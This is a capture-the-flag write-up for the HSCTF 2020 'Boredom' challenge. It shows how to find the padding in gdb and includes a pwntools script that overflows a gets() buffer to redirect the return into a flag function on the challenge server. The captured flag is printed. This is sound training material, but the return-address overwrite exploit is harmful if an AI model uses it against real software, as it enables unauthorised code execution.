# Boredom

>Keith is bored and stuck at home. Give him some things to do.
>
>Connect at nc pwn.hsctf.com 5002.
>
>Note, if you're having trouble getting it to work remotely:
>
>check your offset, the offset is slightly different on the remote server the addresses are still the same Author: PMP


It's a simple buffer overflow challenge, where the goal is to overwrite the address in memory the code reads when it wants to return from a function, shifting execution to a different function which wasn't originally intended.

There's a function called `flag` inside the binary. Executing that function will read the flag from a file and send it back to us.

The first thing we want to do is find the correct padding.

I used a website I found online to generate a random padding:

```
asdhiuesiorghseugohdfghaduguaeriguioaerauigiuaoergeruigsdfuihsdfigseiurgiouseigdfiuhdbfgawyerya3wr3ruawuegfuywa4yufgayurguadhfgeoiurhuseguisdfuigseruigsuioergudfguiseriugiuergiueruigsoiueuihfhugsduifgdfihgiusduigriuegiseuorguseuirgihufuigiudfuigsduhguiregiuerg
```

Then, I set up a breakpoint in gdb and pasted in the padding.

```
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401260 <+0>:	push   %rbp
   0x0000000000401261 <+1>:	mov    %rsp,%rbp
   0x0000000000401264 <+4>:	sub    $0xd0,%rsp
   0x000000000040126b <+11>:	mov    $0x0,%eax
   0x0000000000401270 <+16>:	callq  0x401186 <setup>
   0x0000000000401275 <+21>:	lea    0xeae(%rip),%rdi        # 0x40212a
   0x000000000040127c <+28>:	mov    $0x0,%eax
   0x0000000000401281 <+33>:	callq  0x401040 <printf@plt>
   0x0000000000401286 <+38>:	lea    -0xd0(%rbp),%rax
   0x000000000040128d <+45>:	mov    %rax,%rdi
   0x0000000000401290 <+48>:	mov    $0x0,%eax
   0x0000000000401295 <+53>:	callq  0x401060 <gets@plt>
   0x000000000040129a <+58>:	lea    0xea3(%rip),%rdi        # 0x402144
   0x00000000004012a1 <+65>:	callq  0x401030 <puts@plt>
   0x00000000004012a6 <+70>:	mov    $0x0,%eax
   0x00000000004012ab <+75>:	leaveq
   0x00000000004012ac <+76>:	retq   
End of assembler dump.
(gdb) b *main+76
Breakpoint 1 at 0x4012ac
(gdb) r
Starting program: /home/jordan/CTF-writeups/HSCTF2020/boredom/boredom
I'm currently bored out of my mind. Give me sumpfink to do!
Give me something to do: asdhiuesiorghseugohdfghaduguaeriguioaerauigiuaoergeruigsdfuihsdfigseiurgiouseigdfiuhdbfgawyerya3wr3ruawuegfuywa4yufgayurguadhfgeoiurhuseguisdfuigseruigsuioergudfguiseriugiuergiueruigsoiueuihfhugsduifgdfihgiusduigriuegiseuorguseuirgihufuigiudfuigsduhguiregiuerg
Ehhhhh, maybe later.
```

Then, I printed the padding starting from the stack pointer. (which is where we overwrite the return address at)

```
Breakpoint 1, 0x00000000004012ac in main ()
(gdb) x/100s $rsp
0x7fffffffe0d8:	"giseuorguseuirgihufuigiudfuigsduhguiregiuerg"
```

Search for that string in your padding, and then remove it. You now have the correct padding.

Now we need to find the address of the flag function:

```
(gdb) disas flag
Dump of assembler code for function flag:
   0x00000000004011d5 <+0>:	push   %rbp
   0x00000000004011d6 <+1>:	mov    %rsp,%rbp
   0x00000000004011d9 <+4>:	sub    $0x40,%rsp
   0x00000000004011dd <+8>:	lea    0xe60(%rip),%rsi        # 0x402044
   0x00000000004011e4 <+15>:	lea    0xe5b(%rip),%rdi        # 0x402046
   0x00000000004011eb <+22>:	callq  0x401080 <fopen@plt>
   0x00000000004011f0 <+27>:	mov    %rax,-0x8(%rbp)
   0x00000000004011f4 <+31>:	cmpq   $0x0,-0x8(%rbp)
   0x00000000004011f9 <+36>:	jne    0x40121d <flag+72>
   0x00000000004011fb <+38>:	lea    0xe4e(%rip),%rdi        # 0x402050
   0x0000000000401202 <+45>:	callq  0x401030 <puts@plt>
   0x0000000000401207 <+50>:	lea    0xe92(%rip),%rdi        # 0x4020a0
   0x000000000040120e <+57>:	callq  0x401030 <puts@plt>
   0x0000000000401213 <+62>:	mov    $0x1,%edi
   0x0000000000401218 <+67>:	callq  0x401090 <exit@plt>
   0x000000000040121d <+72>:	mov    -0x8(%rbp),%rdx
   0x0000000000401221 <+76>:	lea    -0x40(%rbp),%rax
   0x0000000000401225 <+80>:	mov    $0x32,%esi
   0x000000000040122a <+85>:	mov    %rax,%rdi
   0x000000000040122d <+88>:	callq  0x401050 <fgets@plt>
   0x0000000000401232 <+93>:	lea    -0x40(%rbp),%rax
   0x0000000000401236 <+97>:	mov    %rax,%rsi
   0x0000000000401239 <+100>:	lea    0xea0(%rip),%rdi        # 0x4020e0
   0x0000000000401240 <+107>:	mov    $0x0,%eax
   0x0000000000401245 <+112>:	callq  0x401040 <printf@plt>
   0x000000000040124a <+117>:	lea    0xecc(%rip),%rdi        # 0x40211d
   0x0000000000401251 <+124>:	callq  0x401030 <puts@plt>
   0x0000000000401256 <+129>:	mov    $0x2a,%edi
   0x000000000040125b <+134>:	callq  0x401090 <exit@plt>
End of assembler dump.
(gdb)
```

We now know the address, that is what we write to the stack pointer.

It turns out that the padding is different from the server for some reason, and the executable is different on the server. The padding is not 216 bytes, but actually 208.

It took some guessing to get the real padding, but in the end I was able to solve it.

```python
from pwn import *

if 'rem' in sys.argv:
    r = remote('pwn.hsctf.com', 5002)
else:
    r = process('./boredom')

filler = b"asdhiuesiorghghaduguaeriguioaerauigiuaoergeruigsdfuihsdfigseiurgiouseigdfiuhdbfgawyerya3wr3ruawuegfuywa4yufgayurguadhfgeoiurhuseguisdfuigseruigsuioergudfguiseriugiuergiueruigsoiueuihfhugsduifgdfihgiusduigriue"
print(len(filler))

r.send(filler)
r.send(p64(0x4011d5))
r.send(b'\n')

r.interactive()
```

```
$ py sol.py rem
[+] Opening connection to pwn.hsctf.com on port 5002: Done
208
[*] Switching to interactive mode
I'm currently bored out of my mind. Give me sumpfink to do!
Give me something to do: Ehhhhh, maybe later.
Hey, that's a neat idea. Here's a flag for your trouble: flag{7h3_k3y_l0n3l1n355_57r1k35_0cff9132}

Now go away.
[*] Got EOF while reading in interactive
$  
```

Flag: `flag{7h3_k3y_l0n3l1n355_57r1k35_0cff9132}`
